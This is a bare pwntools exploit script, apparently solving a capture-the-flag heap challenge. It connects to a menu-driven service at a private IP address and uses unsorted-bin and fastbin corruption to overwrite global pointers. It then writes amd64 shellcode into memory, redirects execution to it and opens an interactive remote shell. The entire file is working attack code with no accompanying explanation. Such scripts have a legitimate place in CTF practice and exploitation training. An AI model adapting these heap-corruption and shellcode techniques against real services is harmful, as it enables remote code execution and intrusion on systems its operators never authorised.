from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"],arch='amd64')

t = remote('192.168.5.186', 9999)




def update(index,size,content):
    t.sendlineafter('Your choice :','3')
    t.sendlineafter('Index: ', str(index))
    t.sendlineafter('Size: ', str(size))
    t.sendafter('Data: ',content)







def new(size,content):
    t.sendlineafter('Your choice :','1')
    t.sendlineafter('Size: ', str(size))
    t.sendafter('Data: ',content)



def free(index):
    t.sendlineafter('Your choice :','2')
    t.sendlineafter('Index: ', str(index))

raw_input()


new(0x60,'1234')
new(0x90,'1234')
new(0x60,'1234')
free(1)
update(1,0x10,p64(0) + p64(0x601060))
new(0x90,'1234')
free(0)
update(0,0x8,p64(0x60106D))
new(0x60,'2134')
new(0x60,'\x00' * 3 + p64(0x601070) + p64(0x601040))
update(8,0x1,'\x10')
payload = asm(shellcraft.amd64.sh())
update(9,len(payload),payload)
update(6,0x8,p64(0x601040))
t.sendlineafter('Your choice :','1')
t.sendlineafter('Size: ', '123')

t.interactive()
